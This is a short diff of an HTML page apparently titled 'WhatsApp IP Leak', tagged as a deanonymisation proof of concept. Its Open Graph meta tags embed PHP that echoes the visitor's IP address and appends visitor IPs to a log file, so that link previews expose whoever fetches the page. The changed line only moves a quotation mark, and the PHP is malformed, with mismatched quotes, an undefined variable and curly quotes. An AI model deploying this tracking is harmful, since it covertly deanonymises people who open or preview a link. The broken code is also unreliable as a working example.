@@ -7,7 +7,7 @@
     <meta property="og:site_name" content="WhatsApp IP Leak" />
     <meta property="og:type" content="text" />
     <meta property="og:description" content="Your IP address: {{.IP}}. <?php
-echo $_SERVER[REMOTE_ADDR];">/>
+echo $_SERVER[REMOTE_ADDR];>"/>
     <meta name="author" content="MArk <?php $_SERVER[REMOTE_ADDR]";echo $line;
 file_put_contents(’visitors.log’, $line . PHP_EOL, FILE_APPEND);?>"/>
     <meta name="keywords" content="whatsapp,leak,disclosure,deanon,poc" />
